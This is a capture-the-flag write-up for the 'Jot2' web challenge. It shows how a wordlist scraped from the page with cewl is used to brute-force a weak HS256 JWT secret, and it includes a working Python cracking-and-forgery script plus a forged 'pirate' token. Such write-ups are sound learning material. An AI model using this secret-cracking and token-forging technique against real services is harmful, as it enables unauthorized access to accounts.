# Jot2

Going to the page will greet us a page with a __small__ piece of text left by `Cap'n Cannonball Cewl`.
You should also notice that you're supposed to escape with the captain if you are able to prove your worth, however upon clicking on it you will get a forbidden message.

Not suprisingly we have to somehow gain access to this page.
Checking our cookies makes us see we have a JWT token which possibly decides what type of access we have.

Attempting to decode this token shows us that we currently have the username of `Space Swab`, so we most likely have to change this to something with more access. 
We can also notice that the alg used is HS256, so the key used to encrypt this token can also be used to decrypt this token. If we find this secret key we can forge our own tokens. 

Putting the singature of Cap'n Cannonball `Cewl` together with us possibly having to find a secret key/word, as well as the massive amounts of words on the page, we can conclude with that the page possibly contains the secret key somewhere, we just have to find the correct one. 

Pulling all the words down from the page can be done with the tool named `cewl`, for example like this:

`cewl http://jot2.tghack.no:1337/ > wordlist`

Doing this gives us a wordlist which we can use to guess the JWT token, and hopefully find a match which will allow us to decode the token without errors. By getting a success we know we hav ethe correct key, and can then use this key to forge our own token. Following the previous task we can here also set our username to `pirate` in order to prove our worth. Doing this should give us access to escape with the captain.  

Python script to solve the challenge after pulling down the words from the page:

```python3

import jwt
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpYXQiOjE2MTQzNDY1NDN9.Rvx97AHCxaEAklGkZOAQINtlVMHAo0P4XPSTaT19XWo"
keys = []

# CeWL the page to get this wordlist
with open('wordlist') as f:
    keys = f.readlines()

keys = [x.strip() for x in keys]

for key in keys:
    try:
        jwt.decode(token,key)
        print(f'Found key: {key}')
        payload = {"username":"pirate","iat":1614345273}
        new_token = jwt.encode(payload,key,algorithm="HS256")
        print(new_token)
    except:
        pass
```

Example working token:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBpcmF0ZSIsImlhdCI6MTYxNDM0NTI3M30.WyYyO4NOldpPZk2cv7GJfgsMfQCUb_FStAiRlfuueWw`